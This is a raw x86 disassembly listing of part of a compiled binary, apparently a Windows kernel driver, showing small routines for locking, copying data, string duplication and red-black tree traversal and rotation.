   10e84:	call   DWORD PTR ds:0x1ee28
   10e8a:	test   eax,eax
   10e8c:	jge    0x10e92
   10e8e:	xor    al,al
   10e90:	jmp    0x10eb5
   10e92:	push   esi
   10e93:	mov    esi,DWORD PTR [ebp+0x8]
   10e96:	push   edi
   10e97:	imul   esi,esi,0x14
   10e9a:	mov    edi,DWORD PTR [ebp+0xc]
   10e9d:	push   0x5
   10e9f:	pop    ecx
   10ea0:	push   0x0
   10ea2:	add    esi,0x7ef84
   10ea8:	push   ebx
   10ea9:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   10eab:	call   DWORD PTR ds:0x1ee24
   10eb1:	pop    edi
   10eb2:	mov    al,0x1
   10eb4:	pop    esi
   10eb5:	pop    ebx
   10eb6:	pop    ebp
   10eb7:	ret    0x8
   10eba:	int3   
   10ebb:	int3   
   10ebc:	int3   
   10ebd:	int3   
   10ebe:	int3   
   10ebf:	int3   
   10ec0:	mov    edi,edi
   10ec2:	push   ebp
   10ec3:	mov    ebp,esp
   10ec5:	push   ebx
   10ec6:	xor    eax,eax
   10ec8:	push   eax
   10ec9:	push   eax
   10eca:	push   eax
   10ecb:	push   eax
   10ecc:	mov    ebx,0x7e534
   10ed1:	push   ebx
   10ed2:	call   DWORD PTR ds:0x1ee28
   10ed8:	test   eax,eax
   10eda:	jl     0x10efd
   10edc:	push   esi
   10edd:	mov    esi,DWORD PTR [ebp+0xc]
   10ee0:	push   edi
   10ee1:	mov    edi,DWORD PTR [ebp+0x8]
   10ee4:	imul   edi,edi,0x14
   10ee7:	push   0x5
   10ee9:	pop    ecx
   10eea:	push   0x0
   10eec:	add    edi,0x7ef84
   10ef2:	push   ebx
   10ef3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   10ef5:	call   DWORD PTR ds:0x1ee24
   10efb:	pop    edi
   10efc:	pop    esi
   10efd:	pop    ebx
   10efe:	pop    ebp
   10eff:	ret    0x8
   10f02:	int3   
   10f03:	int3   
   10f04:	int3   
   10f05:	int3   
   10f06:	int3   
   10f07:	int3   
   10f08:	mov    edi,edi
   10f0a:	push   ebp
   10f0b:	mov    ebp,esp
   10f0d:	sub    esp,0x14
   10f10:	and    DWORD PTR [ebp-0x14],0x0
   10f14:	push   edi
   10f15:	xor    eax,eax
   10f17:	lea    edi,[ebp-0x10]
   10f1a:	stos   DWORD PTR es:[edi],eax
   10f1b:	stos   DWORD PTR es:[edi],eax
   10f1c:	stos   DWORD PTR es:[edi],eax
   10f1d:	stos   DWORD PTR es:[edi],eax
   10f1e:	lea    eax,[ebp-0x14]
   10f21:	push   eax
   10f22:	push   DWORD PTR [ebp+0x8]
   10f25:	call   0x10ec0
   10f2a:	pop    edi
   10f2b:	leave  
   10f2c:	ret    0x4
   10f2f:	int3   
   10f30:	int3   
   10f31:	int3   
   10f32:	int3   
   10f33:	int3   
   10f34:	mov    edi,edi
   10f36:	push   ebp
   10f37:	mov    ebp,esp
   10f39:	push   ebx
   10f3a:	xor    eax,eax
   10f3c:	push   eax
   10f3d:	push   eax
   10f3e:	push   eax
   10f3f:	push   eax
   10f40:	mov    ebx,0x7eec0
   10f45:	push   ebx
   10f46:	call   DWORD PTR ds:0x1ee28
   10f4c:	test   eax,eax
   10f4e:	jl     0x10f6a
   10f50:	push   esi
   10f51:	mov    esi,DWORD PTR [ebp+0x8]
   10f54:	push   edi
   10f55:	push   0x40
   10f57:	pop    ecx
   10f58:	push   0x0
   10f5a:	mov    edi,0x7efb0
   10f5f:	push   ebx
   10f60:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   10f62:	call   DWORD PTR ds:0x1ee24
   10f68:	pop    edi
   10f69:	pop    esi
   10f6a:	pop    ebx
   10f6b:	pop    ebp
   10f6c:	ret    0x4
   10f6f:	int3   
   10f70:	int3   
   10f71:	int3   
   10f72:	int3   
   10f73:	int3   
   10f74:	mov    edi,edi
   10f76:	push   ebp
   10f77:	mov    ebp,esp
   10f79:	push   ebx
   10f7a:	xor    eax,eax
   10f7c:	push   eax
   10f7d:	push   eax
   10f7e:	push   eax
   10f7f:	push   eax
   10f80:	mov    ebx,0x7eec0
   10f85:	push   ebx
   10f86:	call   DWORD PTR ds:0x1ee28
   10f8c:	test   eax,eax
   10f8e:	jge    0x10f94
   10f90:	xor    al,al
   10f92:	jmp    0x10fba
   10f94:	push   esi
   10f95:	push   edi
   10f96:	mov    edi,DWORD PTR [ebp+0x8]
   10f99:	push   0x40
   10f9b:	pop    ecx
   10f9c:	push   0x0
   10f9e:	mov    esi,0x7efb0
   10fa3:	push   ebx
   10fa4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   10fa6:	call   DWORD PTR ds:0x1ee24
   10fac:	xor    eax,eax
   10fae:	cmp    WORD PTR ds:0x7efb0,ax
   10fb5:	pop    edi
   10fb6:	setne  al
   10fb9:	pop    esi
   10fba:	pop    ebx
   10fbb:	pop    ebp
   10fbc:	ret    0x4
   10fbf:	int3   
   10fc0:	int3   
   10fc1:	int3   
   10fc2:	int3   
   10fc3:	int3   
   10fc4:	mov    edi,edi
   10fc6:	push   ebp
   10fc7:	mov    ebp,esp
   10fc9:	push   ebx
   10fca:	mov    ebx,DWORD PTR [ebp+0x8]
   10fcd:	cmp    ebx,0x40
   10fd0:	ja     0x10ffd
   10fd2:	push   esi
   10fd3:	push   edi
   10fd4:	xor    edi,edi
   10fd6:	push   edi
   10fd7:	push   edi
   10fd8:	push   edi
   10fd9:	push   edi
   10fda:	mov    esi,0x7eefc
   10fdf:	push   esi
   10fe0:	call   DWORD PTR ds:0x1ee28
   10fe6:	test   eax,eax
   10fe8:	jl     0x10ffb
   10fea:	push   edi
   10feb:	lea    eax,[ebx*4+0x7e5c0]
   10ff2:	inc    DWORD PTR [eax]
   10ff4:	push   esi
   10ff5:	call   DWORD PTR ds:0x1ee24
   10ffb:	pop    edi
   10ffc:	pop    esi
   10ffd:	pop    ebx
   10ffe:	pop    ebp
   10fff:	ret    0x4
   11002:	int3   
   11003:	int3   
   11004:	int3   
   11005:	int3   
   11006:	int3   
   11007:	int3   
   11008:	mov    edi,edi
   1100a:	push   ebp
   1100b:	mov    ebp,esp
   1100d:	push   ebx
   1100e:	push   esi
   1100f:	push   edi
   11010:	mov    edi,DWORD PTR [ebp+0x8]
   11013:	cmp    edi,0x40
   11016:	ja     0x11041
   11018:	xor    ebx,ebx
   1101a:	push   ebx
   1101b:	push   ebx
   1101c:	push   ebx
   1101d:	push   ebx
   1101e:	mov    esi,0x7eefc
   11023:	push   esi
   11024:	call   DWORD PTR ds:0x1ee28
   1102a:	test   eax,eax
   1102c:	jl     0x11041
   1102e:	mov    edi,DWORD PTR [edi*4+0x7e5c0]
   11035:	push   ebx
   11036:	push   esi
   11037:	call   DWORD PTR ds:0x1ee24
   1103d:	mov    eax,edi
   1103f:	jmp    0x11043
   11041:	xor    eax,eax
   11043:	pop    edi
   11044:	pop    esi
   11045:	pop    ebx
   11046:	pop    ebp
   11047:	ret    0x4
   1104a:	int3   
   1104b:	int3   
   1104c:	int3   
   1104d:	int3   
   1104e:	int3   
   1104f:	int3   
   11050:	mov    edi,edi
   11052:	push   ebp
   11053:	mov    ebp,esp
   11055:	push   esi
   11056:	mov    esi,DWORD PTR [ebp+0x8]
   11059:	push   edi
   1105a:	push   DWORD PTR [esi]
   1105c:	call   0x10a52
   11061:	push   DWORD PTR [esi]
   11063:	mov    edi,eax
   11065:	push   esi
   11066:	push   edi
   11067:	call   0x1da7a
   1106c:	add    esp,0x10
   1106f:	mov    eax,edi
   11071:	pop    edi
   11072:	pop    esi
   11073:	pop    ebp
   11074:	ret    0x4
   11077:	int3   
   11078:	int3   
   11079:	int3   
   1107a:	int3   
   1107b:	int3   
   1107c:	mov    edi,edi
   1107e:	push   esi
   1107f:	mov    esi,ecx
   11081:	push   DWORD PTR [esi+0x8]
   11084:	call   0x1d9f8
   11089:	push   DWORD PTR [esi]
   1108b:	call   0x1d9f8
   11090:	pop    ecx
   11091:	pop    ecx
   11092:	pop    esi
   11093:	ret    
   11094:	int3   
   11095:	int3   
   11096:	int3   
   11097:	int3   
   11098:	int3   
   11099:	int3   
   1109a:	mov    edi,edi
   1109c:	push   ebp
   1109d:	mov    ebp,esp
   1109f:	push   esi
   110a0:	mov    esi,DWORD PTR [ebp+0xc]
   110a3:	push   edi
   110a4:	mov    edi,ecx
   110a6:	cmp    esi,0xffffffff
   110a9:	jne    0x110ba
   110ab:	mov    esi,DWORD PTR [ebp+0x8]
   110ae:	lea    ecx,[esi+0x1]
   110b1:	mov    al,BYTE PTR [esi]
   110b3:	inc    esi
   110b4:	test   al,al
   110b6:	jne    0x110b1
   110b8:	sub    esi,ecx
   110ba:	lea    eax,[esi+0x1]
   110bd:	push   eax
   110be:	call   0x10a52
   110c3:	pop    ecx
   110c4:	mov    DWORD PTR [edi],eax
   110c6:	test   eax,eax
   110c8:	jne    0x110d5
   110ca:	push   0xc000009a
   110cf:	call   DWORD PTR ds:0x1ee14
   110d5:	mov    eax,DWORD PTR [edi]
   110d7:	push   esi
   110d8:	push   DWORD PTR [ebp+0x8]
   110db:	mov    BYTE PTR [esi+eax*1],0x0
   110df:	push   DWORD PTR [edi]
   110e1:	call   0x1da7a
   110e6:	add    esp,0xc
   110e9:	mov    DWORD PTR [edi+0x4],esi
   110ec:	pop    edi
   110ed:	pop    esi
   110ee:	pop    ebp
   110ef:	ret    0x8
   110f2:	int3   
   110f3:	int3   
   110f4:	int3   
   110f5:	int3   
   110f6:	int3   
   110f7:	int3   
   110f8:	mov    edi,edi
   110fa:	push   ebp
   110fb:	mov    ebp,esp
   110fd:	mov    eax,DWORD PTR [ebp+0x8]
   11100:	mov    edx,DWORD PTR [ebp+0xc]
   11103:	push   esi
   11104:	xor    esi,esi
   11106:	jmp    0x1112b
   11108:	mov    ecx,eax
   1110a:	and    ecx,0x1
   1110d:	or     ecx,esi
   1110f:	push   esi
   11110:	jne    0x1111d
   11112:	push   0x2
   11114:	push   edx
   11115:	push   eax
   11116:	call   0x1da62
   1111b:	jmp    0x1112b
   1111d:	push   0x3
   1111f:	push   edx
   11120:	push   eax
   11121:	call   0x1da56
   11126:	add    eax,0x1
   11129:	adc    edx,esi
   1112b:	cmp    eax,0x4
   1112e:	jne    0x11108
   11130:	cmp    edx,esi
   11132:	jne    0x11108
   11134:	pop    esi
   11135:	pop    ebp
   11136:	ret    0x8
   11139:	int3   
   1113a:	int3   
   1113b:	int3   
   1113c:	int3   
   1113d:	int3   
   1113e:	mov    edi,edi
   11140:	push   ebp
   11141:	mov    ebp,esp
   11143:	push   esi
   11144:	push   edi
   11145:	mov    edi,DWORD PTR [ebp+0xc]
   11148:	mov    esi,ecx
   1114a:	cmp    edi,0xffffffff
   1114d:	jne    0x11159
   1114f:	push   DWORD PTR [ebp+0x8]
   11152:	call   0x109ac
   11157:	mov    edi,eax
   11159:	xor    ecx,ecx
   1115b:	push   0x2
   1115d:	pop    edx
   1115e:	lea    eax,[edi+0x1]
   11161:	mul    edx
   11163:	seto   cl
   11166:	neg    ecx
   11168:	or     ecx,eax
   1116a:	push   ecx
   1116b:	call   0x10a52
   11170:	pop    ecx
   11171:	mov    DWORD PTR [esi],eax
   11173:	test   eax,eax
   11175:	jne    0x11182
   11177:	push   0xc000009a
   1117c:	call   DWORD PTR ds:0x1ee14
   11182:	mov    ecx,DWORD PTR [esi]
   11184:	lea    eax,[edi+edi*1]
   11187:	push   eax
   11188:	push   DWORD PTR [ebp+0x8]
   1118b:	xor    edx,edx
   1118d:	mov    WORD PTR [eax+ecx*1],dx
   11191:	push   DWORD PTR [esi]
   11193:	call   0x1da7a
   11198:	add    esp,0xc
   1119b:	mov    DWORD PTR [esi+0x4],edi
   1119e:	pop    edi
   1119f:	pop    esi
   111a0:	pop    ebp
   111a1:	ret    0x8
   111a4:	int3   
   111a5:	int3   
   111a6:	int3   
   111a7:	int3   
   111a8:	int3   
   111a9:	int3   
   111aa:	mov    edi,edi
   111ac:	push   ebp
   111ad:	mov    ebp,esp
   111af:	mov    eax,DWORD PTR [ebp+0x8]
   111b2:	mov    edx,DWORD PTR ds:0x7f8b8
   111b8:	jmp    0x111bc
   111ba:	mov    eax,ecx
   111bc:	mov    ecx,DWORD PTR [eax+0x8]
   111bf:	cmp    ecx,edx
   111c1:	jne    0x111ba
   111c3:	pop    ebp
   111c4:	ret    0x4
   111c7:	int3   
   111c8:	int3   
   111c9:	int3   
   111ca:	int3   
   111cb:	int3   
   111cc:	mov    edi,edi
   111ce:	push   ebp
   111cf:	mov    ebp,esp
   111d1:	mov    eax,DWORD PTR [ebp+0x8]
   111d4:	mov    edx,DWORD PTR ds:0x7f8b8
   111da:	jmp    0x111de
   111dc:	mov    eax,ecx
   111de:	mov    ecx,DWORD PTR [eax]
   111e0:	cmp    ecx,edx
   111e2:	jne    0x111dc
   111e4:	pop    ebp
   111e5:	ret    0x4
   111e8:	int3   
   111e9:	int3   
   111ea:	int3   
   111eb:	int3   
   111ec:	int3   
   111ed:	int3   
   111ee:	mov    edi,edi
   111f0:	push   ebp
   111f1:	mov    ebp,esp
   111f3:	mov    eax,DWORD PTR [ebp+0x8]
   111f6:	mov    edx,DWORD PTR ds:0x7f8bc
   111fc:	jmp    0x11200
   111fe:	mov    eax,ecx
   11200:	mov    ecx,DWORD PTR [eax+0x8]
   11203:	cmp    ecx,edx
   11205:	jne    0x111fe
   11207:	pop    ebp
   11208:	ret    0x4
   1120b:	int3   
   1120c:	int3   
   1120d:	int3   
   1120e:	int3   
   1120f:	int3   
   11210:	mov    edi,edi
   11212:	push   ebp
   11213:	mov    ebp,esp
   11215:	mov    eax,DWORD PTR [ebp+0x8]
   11218:	mov    edx,DWORD PTR ds:0x7f8bc
   1121e:	jmp    0x11222
   11220:	mov    eax,ecx
   11222:	mov    ecx,DWORD PTR [eax]
   11224:	cmp    ecx,edx
   11226:	jne    0x11220
   11228:	pop    ebp
   11229:	ret    0x4
   1122c:	int3   
   1122d:	int3   
   1122e:	int3   
   1122f:	int3   
   11230:	int3   
   11231:	int3   
   11232:	mov    edi,edi
   11234:	push   ebp
   11235:	mov    ebp,esp
   11237:	mov    eax,DWORD PTR [ebp+0x8]
   1123a:	mov    edx,DWORD PTR ds:0x7f8c0
   11240:	jmp    0x11244
   11242:	mov    eax,ecx
   11244:	mov    ecx,DWORD PTR [eax+0x8]
   11247:	cmp    ecx,edx
   11249:	jne    0x11242
   1124b:	pop    ebp
   1124c:	ret    0x4
   1124f:	int3   
   11250:	int3   
   11251:	int3   
   11252:	int3   
   11253:	int3   
   11254:	mov    edi,edi
   11256:	push   ebp
   11257:	mov    ebp,esp
   11259:	mov    eax,DWORD PTR [ebp+0x8]
   1125c:	mov    edx,DWORD PTR ds:0x7f8c0
   11262:	jmp    0x11266
   11264:	mov    eax,ecx
   11266:	mov    ecx,DWORD PTR [eax]
   11268:	cmp    ecx,edx
   1126a:	jne    0x11264
   1126c:	pop    ebp
   1126d:	ret    0x4
   11270:	int3   
   11271:	int3   
   11272:	int3   
   11273:	int3   
   11274:	int3   
   11275:	int3   
   11276:	mov    edi,edi
   11278:	push   esi
   11279:	mov    esi,ecx
   1127b:	mov    ecx,DWORD PTR [esi]
   1127d:	cmp    DWORD PTR [ecx+0x14],0x0
   11281:	jne    0x11290
   11283:	mov    eax,DWORD PTR [ecx+0x4]
   11286:	cmp    DWORD PTR [eax+0x4],ecx
   11289:	jne    0x11290
   1128b:	mov    eax,DWORD PTR [ecx+0x8]
   1128e:	jmp    0x112ad
   11290:	mov    eax,DWORD PTR [ecx]
   11292:	cmp    eax,DWORD PTR ds:0x7f8b8
   11298:	je     0x112a6
   1129a:	push   eax
   1129b:	call   0x111aa
   112a0:	jmp    0x112ad
   112a2:	mov    DWORD PTR [esi],eax
   112a4:	mov    ecx,eax
   112a6:	mov    eax,DWORD PTR [ecx+0x4]
   112a9:	cmp    ecx,DWORD PTR [eax]
   112ab:	je     0x112a2
   112ad:	mov    DWORD PTR [esi],eax
   112af:	pop    esi
   112b0:	ret    
   112b1:	int3   
   112b2:	int3   
   112b3:	int3   
   112b4:	int3   
   112b5:	int3   
   112b6:	mov    edi,edi
   112b8:	push   esi
   112b9:	mov    esi,ecx
   112bb:	mov    ecx,DWORD PTR [esi]
   112bd:	mov    eax,DWORD PTR [ecx+0x8]
   112c0:	cmp    eax,DWORD PTR ds:0x7f8b8
   112c6:	je     0x112d4
   112c8:	push   eax
   112c9:	call   0x111cc
   112ce:	jmp    0x112e3
   112d0:	mov    DWORD PTR [esi],eax
   112d2:	mov    ecx,eax
   112d4:	mov    eax,DWORD PTR [ecx+0x4]
   112d7:	cmp    ecx,DWORD PTR [eax+0x8]
   112da:	je     0x112d0
   112dc:	mov    ecx,DWORD PTR [esi]
   112de:	cmp    DWORD PTR [ecx+0x8],eax
   112e1:	je     0x112e5
   112e3:	mov    DWORD PTR [esi],eax
   112e5:	pop    esi
   112e6:	ret    
   112e7:	int3   
   112e8:	int3   
   112e9:	int3   
   112ea:	int3   
   112eb:	int3   
   112ec:	mov    edi,edi
   112ee:	push   ebp
   112ef:	mov    ebp,esp
   112f1:	mov    edx,DWORD PTR [ebp+0x8]
   112f4:	mov    eax,DWORD PTR [edx+0x8]
   112f7:	push   esi
   112f8:	mov    esi,DWORD PTR [eax]
   112fa:	mov    DWORD PTR [edx+0x8],esi
   112fd:	mov    esi,DWORD PTR [eax]
   112ff:	cmp    esi,DWORD PTR ds:0x7f8c4
   11305:	je     0x1130a
   11307:	mov    DWORD PTR [esi+0x4],edx
   1130a:	mov    esi,DWORD PTR [edx+0x4]
   1130d:	mov    DWORD PTR [eax+0x4],esi
   11310:	mov    ecx,DWORD PTR [ecx+0x4]
   11313:	pop    esi
   11314:	cmp    edx,DWORD PTR [ecx+0x4]
   11317:	jne    0x1131e
   11319:	mov    DWORD PTR [ecx+0x4],eax
   1131c:	jmp    0x1132c
   1131e:	mov    ecx,DWORD PTR [edx+0x4]
   11321:	cmp    edx,DWORD PTR [ecx]
   11323:	jne    0x11329
   11325:	mov    DWORD PTR [ecx],eax
   11327:	jmp    0x1132c
   11329:	mov    DWORD PTR [ecx+0x8],eax
   1132c:	mov    DWORD PTR [eax],edx
   1132e:	mov    DWORD PTR [edx+0x4],eax
   11331:	pop    ebp
   11332:	ret    0x4
   11335:	int3   
   11336:	int3   
   11337:	int3   
   11338:	int3   
   11339:	int3   
   1133a:	mov    edi,edi
   1133c:	push   ebp
   1133d:	mov    ebp,esp
   1133f:	mov    eax,DWORD PTR [ebp+0x8]
   11342:	mov    edx,DWORD PTR ds:0x7f8c4
   11348:	jmp    0x1134c
   1134a:	mov    eax,ecx
   1134c:	mov    ecx,DWORD PTR [eax+0x8]
   1134f:	cmp    ecx,edx
   11351:	jne    0x1134a
   11353:	pop    ebp
   11354:	ret    0x4
   11357:	int3   
   11358:	int3   
   11359:	int3   
   1135a:	int3   
   1135b:	int3   
   1135c:	mov    edi,edi
   1135e:	push   ebp
   1135f:	mov    ebp,esp
   11361:	mov    edx,DWORD PTR [ebp+0x8]
   11364:	mov    eax,DWORD PTR [edx]
   11366:	push   esi
   11367:	mov    esi,DWORD PTR [eax+0x8]
   1136a:	mov    DWORD PTR [edx],esi
   1136c:	mov    esi,DWORD PTR [eax+0x8]
   1136f:	cmp    esi,DWORD PTR ds:0x7f8c4
   11375:	je     0x1137a
   11377:	mov    DWORD PTR [esi+0x4],edx
   1137a:	mov    esi,DWORD PTR [edx+0x4]
   1137d:	mov    DWORD PTR [eax+0x4],esi
   11380:	mov    ecx,DWORD PTR [ecx+0x4]
   11383:	pop    esi
   11384:	cmp    edx,DWORD PTR [ecx+0x4]
   11387:	jne    0x1138e
   11389:	mov    DWORD PTR [ecx+0x4],eax
   1138c:	jmp    0x1139d
   1138e:	mov    ecx,DWORD PTR [edx+0x4]
   11391:	cmp    edx,DWORD PTR [ecx+0x8]
   11394:	jne    0x1139b
   11396:	mov    DWORD PTR [ecx+0x8],eax
   11399:	jmp    0x1139d
   1139b:	mov    DWORD PTR [ecx],eax
   1139d:	mov    DWORD PTR [eax+0x8],edx
   113a0:	mov    DWORD PTR [edx+0x4],eax
   113a3:	pop    ebp
   113a4:	ret    0x4
   113a7:	int3   
   113a8:	int3   
   113a9:	int3   
   113aa:	int3   
   113ab:	int3   
   113ac:	mov    edi,edi
   113ae:	push   esi
   113af:	mov    esi,ecx
   113b1:	mov    ecx,DWORD PTR [esi]
   113b3:	cmp    DWORD PTR [ecx+0x68],0x0
   113b7:	jne    0x113c6
   113b9:	mov    eax,DWORD PTR [ecx+0x4]
   113bc:	cmp    DWORD PTR [eax+0x4],ecx
   113bf:	jne    0x113c6
   113c1:	mov    eax,DWORD PTR [ecx+0x8]
   113c4:	jmp    0x113e3
   113c6:	mov    eax,DWORD PTR [ecx]
   113c8:	cmp    eax,DWORD PTR ds:0x7f8c4
   113ce:	je     0x113dc
   113d0:	push   eax
   113d1:	call   0x1133a
   113d6:	jmp    0x113e3
   113d8:	mov    DWORD PTR [esi],eax
   113da:	mov    ecx,eax
   113dc:	mov    eax,DWORD PTR [ecx+0x4]
   113df:	cmp    ecx,DWORD PTR [eax]
   113e1:	je     0x113d8
   113e3:	mov    DWORD PTR [esi],eax
   113e5:	pop    esi
   113e6:	ret    
   113e7:	int3   
   113e8:	int3   
   113e9:	int3   
   113ea:	int3   
   113eb:	int3   
   113ec:	mov    edi,edi
   113ee:	push   ebp
   113ef:	mov    ebp,esp
   113f1:	mov    eax,DWORD PTR [ebp+0x8]
   113f4:	mov    edx,DWORD PTR ds:0x7f8c8
   113fa:	jmp    0x113fe
   113fc:	mov    eax,ecx
   113fe:	mov    ecx,DWORD PTR [eax+0x8]
   11401:	cmp    ecx,edx
   11403:	jne    0x113fc
   11405:	pop    ebp
   11406:	ret    0x4
   11409:	int3   
   1140a:	int3   
   1140b:	int3   
   1140c:	int3   
   1140d:	int3   
   1140e:	mov    edi,edi
   11410:	push   ebp
   11411:	mov    ebp,esp
   11413:	mov    eax,DWORD PTR [ebp+0x8]
   11416:	mov    edx,DWORD PTR ds:0x7f8c8
   1141c:	jmp    0x11420
   1141e:	mov    eax,ecx
   11420:	mov    ecx,DWORD PTR [eax]
   11422:	cmp    ecx,edx
   11424:	jne    0x1141e
   11426:	pop    ebp
   11427:	ret    0x4
   1142a:	int3   
   1142b:	int3   
   1142c:	int3   
   1142d:	int3   
   1142e:	int3   
   1142f:	int3   
   11430:	mov    edi,edi
   11432:	push   esi
   11433:	mov    esi,ecx
   11435:	mov    ecx,DWORD PTR [esi]
   11437:	cmp    DWORD PTR [ecx+0x1c],0x0
   1143b:	jne    0x1144a
   1143d:	mov    eax,DWORD PTR [ecx+0x4]
   11440:	cmp    DWORD PTR [eax+0x4],ecx
   11443:	jne    0x1144a
   11445:	mov    eax,DWORD PTR [ecx+0x8]
   11448:	jmp    0x11467
   1144a:	mov    eax,DWORD PTR [ecx]
   1144c:	cmp    eax,DWORD PTR ds:0x7f8c8
   11452:	je     0x11460
   11454:	push   eax
   11455:	call   0x113ec
   1145a:	jmp    0x11467
   1145c:	mov    DWORD PTR [esi],eax
   1145e:	mov    ecx,eax
   11460:	mov    eax,DWORD PTR [ecx+0x4]
   11463:	cmp    ecx,DWORD PTR [eax]
   11465:	je     0x1145c
   11467:	mov    DWORD PTR [esi],eax
   11469:	pop    esi
   1146a:	ret    
   1146b:	int3   
   1146c:	int3   
   1146d:	int3   
   1146e:	int3   
   1146f:	int3   
   11470:	mov    edi,edi
   11472:	push   ebp
   11473:	mov    ebp,esp
   11475:	mov    eax,DWORD PTR [ebp+0x8]
   11478:	mov    edx,DWORD PTR ds:0x7f8cc
   1147e:	jmp    0x11482
   11480:	mov    eax,ecx
   11482:	mov    ecx,DWORD PTR [eax+0x8]
   11485:	cmp    ecx,edx
   11487:	jne    0x11480
   11489:	pop    ebp
   1148a:	ret    0x4
   1148d:	int3   
   1148e:	int3   
   1148f:	int3   
   11490:	int3   
   11491:	int3   
   11492:	mov    edi,edi
   11494:	push   ebp
   11495:	mov    ebp,esp
   11497:	mov    eax,DWORD PTR [ebp+0x8]
   1149a:	mov    edx,DWORD PTR ds:0x7f8cc
   114a0:	jmp    0x114a4
   114a2:	mov    eax,ecx
   114a4:	mov    ecx,DWORD PTR [eax]
   114a6:	cmp    ecx,edx
   114a8:	jne    0x114a2
   114aa:	pop    ebp
   114ab:	ret    0x4
   114ae:	int3   
   114af:	int3   
   114b0:	int3   
   114b1:	int3   
   114b2:	int3   
   114b3:	int3   
   114b4:	mov    edi,edi
   114b6:	push   esi
   114b7:	mov    esi,ecx
   114b9:	mov    ecx,DWORD PTR [esi]
   114bb:	cmp    DWORD PTR [ecx+0x14],0x0
   114bf:	jne    0x114ce
   114c1:	mov    eax,DWORD PTR [ecx+0x4]
   114c4:	cmp    DWORD PTR [eax+0x4],ecx
   114c7:	jne    0x114ce
   114c9:	mov    eax,DWORD PTR [ecx+0x8]
   114cc:	jmp    0x114eb
   114ce:	mov    eax,DWORD PTR [ecx]
   114d0:	cmp    eax,DWORD PTR ds:0x7f8cc
   114d6:	je     0x114e4
   114d8:	push   eax
   114d9:	call   0x11470
   114de:	jmp    0x114eb
   114e0:	mov    DWORD PTR [esi],eax
   114e2:	mov    ecx,eax
   114e4:	mov    eax,DWORD PTR [ecx+0x4]
   114e7:	cmp    ecx,DWORD PTR [eax]
   114e9:	je     0x114e0
   114eb:	mov    DWORD PTR [esi],eax
   114ed:	pop    esi
   114ee:	ret    
   114ef:	int3   
   114f0:	int3   
   114f1:	int3   
   114f2:	int3   
   114f3:	int3   
   114f4:	mov    edi,edi
   114f6:	push   esi
   114f7:	mov    esi,ecx
   114f9:	mov    ecx,DWORD PTR [esi]
   114fb:	cmp    DWORD PTR [ecx+0x70],0x0
   114ff:	jne    0x1150e
   11501:	mov    eax,DWORD PTR [ecx+0x4]
   11504:	cmp    DWORD PTR [eax+0x4],ecx
   11507:	jne    0x1150e
   11509:	mov    eax,DWORD PTR [ecx+0x8]
   1150c:	jmp    0x1152b
   1150e:	mov    eax,DWORD PTR [ecx]
   11510:	cmp    eax,DWORD PTR ds:0x7f8c0
   11516:	je     0x11524
   11518:	push   eax
   11519:	call   0x11232
   1151e:	jmp    0x1152b
   11520:	mov    DWORD PTR [esi],eax
   11522:	mov    ecx,eax
   11524:	mov    eax,DWORD PTR [ecx+0x4]
   11527:	cmp    ecx,DWORD PTR [eax]
   11529:	je     0x11520
   1152b:	mov    DWORD PTR [esi],eax
   1152d:	pop    esi
   1152e:	ret    
   1152f:	int3   
   11530:	int3   
   11531:	int3   
   11532:	int3   
   11533:	int3   
   11534:	mov    edi,edi
   11536:	push   esi
   11537:	mov    esi,ecx
   11539:	mov    ecx,DWORD PTR [esi]
   1153b:	mov    eax,DWORD PTR [ecx+0x8]
   1153e:	cmp    eax,DWORD PTR ds:0x7f8c8
   11544:	je     0x11552
   11546:	push   eax
   11547:	call   0x1140e
   1154c:	jmp    0x11561
   1154e:	mov    DWORD PTR [esi],eax
   11550:	mov    ecx,eax
   11552:	mov    eax,DWORD PTR [ecx+0x4]
   11555:	cmp    ecx,DWORD PTR [eax+0x8]
   11558:	je     0x1154e
   1155a:	mov    ecx,DWORD PTR [esi]
   1155c:	cmp    DWORD PTR [ecx+0x8],eax
   1155f:	je     0x11563
   11561:	mov    DWORD PTR [esi],eax
   11563:	pop    esi
   11564:	ret    
   11565:	int3   
   11566:	int3   
   11567:	int3   
   11568:	int3   
   11569:	int3   
   1156a:	mov    edi,edi
   1156c:	push   esi
   1156d:	mov    esi,ecx
   1156f:	mov    ecx,DWORD PTR [esi]
   11571:	mov    eax,DWORD PTR [ecx+0x8]
   11574:	cmp    eax,DWORD PTR ds:0x7f8cc
   1157a:	je     0x11588
   1157c:	push   eax
   1157d:	call   0x11492
   11582:	jmp    0x11597
   11584:	mov    DWORD PTR [esi],eax
   11586:	mov    ecx,eax
   11588:	mov    eax,DWORD PTR [ecx+0x4]
   1158b:	cmp    ecx,DWORD PTR [eax+0x8]
   1158e:	je     0x11584
   11590:	mov    ecx,DWORD PTR [esi]
   11592:	cmp    DWORD PTR [ecx+0x8],eax
   11595:	je     0x11599
   11597:	mov    DWORD PTR [esi],eax
   11599:	pop    esi
   1159a:	ret    
   1159b:	int3   
   1159c:	int3   
   1159d:	int3   
   1159e:	int3   
   1159f:	int3   
   115a0:	mov    edi,edi
   115a2:	push   ebp
   115a3:	mov    ebp,esp
   115a5:	mov    eax,DWORD PTR [ebp+0x8]
   115a8:	mov    edx,DWORD PTR ds:0x7f8d4
   115ae:	jmp    0x115b2
   115b0:	mov    eax,ecx
   115b2:	mov    ecx,DWORD PTR [eax+0x8]
   115b5:	cmp    ecx,edx
   115b7:	jne    0x115b0
   115b9:	pop    ebp
   115ba:	ret    0x4
   115bd:	int3   
   115be:	int3   
   115bf:	int3   
   115c0:	int3   
   115c1:	int3   
   115c2:	mov    edi,edi
   115c4:	push   ebp
   115c5:	mov    ebp,esp
   115c7:	push   ecx
   115c8:	push   ecx
   115c9:	mov    eax,DWORD PTR [ebp+0x8]
   115cc:	mov    DWORD PTR [ebp-0x4],eax
   115cf:	lea    ecx,[eax+0x2]
   115d2:	mov    dx,WORD PTR [eax]
   115d5:	inc    eax
   115d6:	inc    eax
   115d7:	test   dx,dx
   115da:	jne    0x115d2
   115dc:	sub    eax,ecx
   115de:	sar    eax,1
   115e0:	mov    WORD PTR [ebp-0x8],ax
   115e4:	mov    eax,DWORD PTR [ebp-0x8]
   115e7:	add    eax,eax
   115e9:	mov    WORD PTR [ebp-0x6],ax
   115ed:	mov    WORD PTR [ebp-0x8],ax
